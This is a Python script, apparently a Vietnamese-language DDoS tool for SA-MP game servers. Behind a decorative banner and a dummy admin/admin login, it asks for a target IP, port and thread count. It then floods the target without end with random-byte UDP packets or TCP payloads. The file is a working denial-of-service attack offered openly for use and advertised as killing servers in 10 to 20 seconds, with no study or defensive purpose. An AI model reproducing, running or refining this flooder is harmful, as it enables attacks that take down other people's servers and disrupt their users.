#Bebas Rename By Xcyber
#Author = Wiondead
import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[1;31;40m")
os.system("clear")
print("""\033[93m
\033[93m
 █████                          ███
░░███                          ░░░
 ░███         ██████   ███████ ████  ████████
 ░███        ███░░███ ███░░███░░███ ░░███░░███
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███
 ███████████░░██████ ░░███████ █████ ████ █████
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░
                      ███ ░███
                     ░░██████
                      ░░░░░░
             \033[93m>> \033[96mTool Private Làm Bởi Wiond \033[93m<<
            \033[97m
   ███
  █   █
\033[97m  █   █                      \033[93m Nếu Có Lỗi Hãy Liên Hệ Discord [ Canady#3890 ]
\033[97m█████████               ██   \033[93m Discord Apex C2 x Api
\033[97m█████████              █  █  \033[93m https://discord.gg/FNArMC8fKs \033[97m
\033[97m███   ███ ██████████████  █
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m

""")
username = str(input("\033[33m[Private] \033[93mTên Đăng Nhập:"))
password = str(input("\033[33m[Private] \033[93mMật Khẩu:"))
if password == "admin" and username == "admin":
    print ("Đăng Nhập Thành Công !!!")
    time.sleep(2)

else:
    print ("Mật Khẩu Không Đúng Hoặc Sai !!!")
    time.sleep(20)

os.system("clear")
print("\033[92mĐANG ĐĂNG NHẬP [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("ĐANG ĐĂNG NHẬP [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("ĐANG ĐĂNG NHẬP [\033[97m•••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("ĐANG ĐĂNG NHẬP [\033[97m••\033[92m]")
time.sleep(0.9)

os.system("clear")
print("ĐANG ĐĂNG NHẬP [\033[97m•\033[92m]")
time.sleep(0.9)

os.system("clear")
print("""
  ____           _         _            ____
 / ___| __ _  __| | __ _  | |   _   _  | __ )  __ _ _   _
| |  _ / _` |/ _` |/ _` | | |  | | | | |  _ \ / _` | | | | [+] Author  : Canady#3890
| |_| | (_| | (_| | (_| | | |__| |_| | | |_) | (_| | |_| | [+] Youtube : https://youtube.com/@wionz766
 \____|\__,_|\__,_|\__,_| |_____\__,_| |____/ \__,_|\__,_| [+] Trick SAMP Làm Nên Thương Hiệu
""")
print("""\033[1;36;40m
___________________________________________

[•] Lệnh DDOS Samp Là [ UDP ]
[•] Tools DDOS Samp Vip Pro [ 10s >> 20s Die ]
[•] Đăng Ký Ủng Hộ Tôi, Thank You ⬇⬇⬇
[•] Link YTB [ https://youtube.com/@wionz766 ]
___________________________________________
""")

ip = str(input("\033[1;36;40m[+] Ip Server ( Số ) : \033[1;31;40m"))
port = int(input("\033[1;36;40m[+] Port : \033[1;31;40m"))
choice = str(input("\033[1;36;40m[+] Lệnh DDOS ( VD: UDP ) : \033[1;31;40m"))
times = int(input("\033[1;36;40m[+] PACKET ( 1000 ) : \033[1;31;40m"))
threads = int(input("\033[1;36;40m[+] THREADS ( 1000 ) : \033[1;31;40m"))

os.system("clear")
def run():

	data = random._urandom(1050)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print("\033[1;36;40mTham Thì Thâm Ngu Thì Die %s Port %s"%(ip,port))

		except:

			print("Tham Thì Thâm Ngu Thì Die")



def run2():

	data = random._urandom(102498)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print("\033[1;36;40mTham Thì Thâm Ngu Thì Die %s Port %s"%(ip,port))

		except:

			s.close()

			print("Tham Thì Thâm Ngu Thì Die")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()
